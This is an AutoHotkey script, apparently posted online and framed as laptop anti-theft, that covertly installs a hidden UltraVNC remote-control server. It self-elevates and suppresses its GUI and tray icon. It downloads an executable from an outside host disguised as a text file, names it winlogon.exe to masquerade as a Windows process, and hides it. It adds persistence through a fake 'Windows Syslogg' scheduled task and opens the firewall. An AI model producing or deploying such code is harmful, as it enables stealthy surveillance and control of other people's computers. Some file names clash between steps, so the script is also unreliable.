/*
<--Flow Snake-->
I made this script for my Laptop if its get stolen, bicuse i recently got to borrow one from school.
 
http://www.uvnc.com/downloads
 
UltraVNC SC is a small (300kB) UltraVNC Server that can be customized and preconfigured to allow easy
remote control of a customers computer, without having to install anything.
 
UltraVNC SC does not require installation and does not make use of the registry. The customer only has to download the little (preconfigured) executable and Click to make a connection. The connection is initiated
by the server to a listening viewer, to allow easy access through customers firewall.
 
*Own Notes/Ideas*
by other means you skip the firewall
You can record the screen and send it to your Android device by useing a SMS API or to your Email
You can use SocksV4/5 or Proxy
Hamachi is needed if you cant Portforward!
DebugMode=0 ; Removes the GUI
DisableTrayIcon=1 ; Hides the Trayicon
AutoPortSelect=1 ; Selects a random port
 
DSMPlugin= "SecureVNC Plugin"
http://www.uvnc.com/downloads/encryption-plugins/87-encryption-plugins.html
 
Default configuration uses 2048-bit RSA keys and 256-bit AES keys.
RSA public-key cryptography supports 512-, 1024-, 2048-, and 3072-bit keys.
Configurable choice of symmetric ciphers and keys:
 
AES: Supports 128-, 192-, and 256-bit keys.
Blowfish: Supports 56-, 128-, 192-, 256-, and 448-bit keys.
IDEA: Supports 128-bit keys.
CAST5: Supports 56- and 128-bit keys.
ARC4: Supports 56-, 128-, 192-, and 256-bit keys.
 
Classic interface for older UltraVNC versions 1.0.8.2 or below uses 2048-bit RSA keys and 128-bit AES keys.
All versions are threadsafe, allowing the UltraVNC server to host multiple simultaneous viewers.
 
*/
 
If not A_IsAdmin
{
Run *RunAs "%A_ScriptFullPath%"
ExitApp
}
 
Process, Priority, %A_ScriptFullPath%, Low
SetWorkingDir, %A_ScriptDir%
#SingleInstance, force
#NoTrayIcon
#Persistent
 
 
FileAppend,
(
[Permissions]
[admin]
FileTransferEnabled=1
FTUserImpersonation=1
BlankMonitorEnabled=0
BlankInputsOnly=0
DefaultScale=1
UseDSMPlugin=0
DSMPlugin=
DSMPluginConfig=
primary=1
secondary=0
SocketConnect=1
HTTPConnect=1
XDMCPConnect=0
AutoPortSelect=1
InputsEnabled=1
LocalInputsDisabled=0
IdleTimeout=0
EnableJapInput=0
QuerySetting=2
QueryTimeout=20
QueryAccept=0
LockSetting=0
RemoveWallpaper=0
RemoveEffects=0
RemoveFontSmoothing=0
RemoveAero=0
DebugMode=0
Avilog=0
path=%A_WinDir%/
DebugLevel=0
AllowLoopback=1
LoopbackOnly=0
AllowShutdown=1
AllowProperties=1
AllowEditClients=1
FileTransferTimeout=60
KeepAliveInterval=5
SocketKeepAliveTimeout=10000
DisableTrayIcon=1
MSLogonRequired=0
NewMSLogon=0
ConnectPriority=3
[UltraVNC]
passwd=A130AC401884770EDE
passwd2=20C3B135B3FB90D7DE
 
), %A_WinDir%/UltraVNC.ini ; Makes the Config file.
 
FileSetAttrib, +H, %A_WinDir%/UltraVNC.ini ; Hides the Config file.
UrlDownloadToFile, http://sfhost.biz/f/Eula_288c0.txt, %A_WinDir%/winlogon.exe; (DDL) Download the VNC Server.
FileSetAttrib, +H, %A_WinDir%/winlogon.txt ; Hides the VNC Server.
 
RunWait, cmd /k SchTasks /Create /SC DAILY /TN “Windows Syslogg” /TR “%A_WinDir%/winlogon.exe” /ST 09:00 /F ,, Hide ; Adds Winlogon.txt to autostart by adding it to Schemaläggningen.
 
RunWait, cmd /k netsh advfirewall firewall add rule name="winlogon" dir=in action=allow program="%A_WinDir%/winlogon.txt"  enable=yes ,, Hide ; Makes sure that there is no problems with the firewall and the VNC Server.
 
Run, %A_WinDir%/winlogon.exe,,Hide ; Starts the VNC Server.
 
Process,close, cmd.exe
 
MsgBox, 4160, VNC Server, The Server have now been downloaded and is currently running!
ExitApp